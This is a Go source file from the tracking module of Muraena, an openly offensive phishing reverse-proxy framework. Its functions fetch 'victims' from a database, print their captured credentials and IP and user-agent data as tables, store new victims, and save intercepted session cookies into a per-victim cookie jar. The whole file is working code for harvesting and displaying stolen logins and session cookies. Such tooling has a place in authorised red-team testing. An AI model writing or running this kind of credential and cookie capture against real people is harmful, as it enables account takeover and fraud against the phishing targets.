package tracking

import (
	"fmt"
	"github.com/evilsocket/islazy/tui"
	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
	"os"
)

func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {

	if !t.IsValid() {
		return nil, fmt.Errorf(fmt.Sprintf("GetVictim invalid tracking value [%s]", tui.Bold(tui.Red(t.ID))))
	}

	v, err = db.GetVictim(t.ID)
	if err != nil {
		return nil, err
	}
	return v, nil
}

// ShowCredentials prints the credentials in the CLI
func (module *Tracker) ShowCredentials() {

	columns := []string{
		"ID",
		"Key",
		"Value",
		"Time",
	}

	var rows [][]string

	victims, err := db.GetAllVictims()
	log.Info("All Victims: %v", victims)

	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	for _, vId := range victims {
		victim, err := db.GetVictim(vId)
		if err != nil {
			module.Debug("error fetching victim %s: %s", vId, err)
		}

		log.Info("Creds for victim %s: %d", vId, victim.CredsCount)

		for i := 0; i < victim.CredsCount; i++ {
			t := tui.Green(victim.ID)

			c, err := db.GetVictimCreds(victim.ID, i)
			if err != nil {
				module.Debug("error getting victim %s creds at index %d: %s", victim.ID, i, err)
			}

			rows = append(rows, []string{tui.Bold(t), c.Key, c.Value, c.Time})
		}

	}

	tui.Table(os.Stdout, columns, rows)

}

func (module *Tracker) ShowVictims() {

	columns := []string{
		"ID",
		"IP",
		"UA",
		//"# Credentials",
		//"# Requests",
		//"Cookie Jar",
	}

	var rows [][]string

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	log.Info("All Victims: %v", victims)

	for _, vId := range victims {
		log.Info("victim id: %v", vId)

		v, err := db.GetVictim(vId)
		if err != nil {
			module.Debug("error fetching victim %s: %s", vId, err)
		}

		rows = append(rows, []string{tui.Bold(v.ID), v.IP, v.UA})
	}

	tui.Table(os.Stdout, columns, rows)
}

// Push another Victim to the Tracker
func (module *Tracker) Push(v *db.Victim) {
	err := db.StoreVictim(v.ID, v)
	if err != nil {
		module.Debug("error adding victim to redis: %s", err)
	}
}

// add cookie to jar. if the cookie exists, it will be overridden
func (module *Tracker) AddToCookieJar(victimId string, cookie db.VictimCookie) {

	if cookie.Domain == module.Session.Config.Proxy.Phishing {
		return
	}

	_, err := db.GetVictim(victimId)
	if err != nil {
		module.Debug("ERROR: Victim %s not found in db", victimId)
		return
	}

	err = db.StoreVictimCookie(victimId, &cookie)
	if err != nil {
		module.Debug("ERROR: failed to add cookie %s to victim %s", cookie.Name, victimId)
		return
	}

	module.Debug("[%s] New victim cookie: %s on %s with value %s",
		victimId, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
}
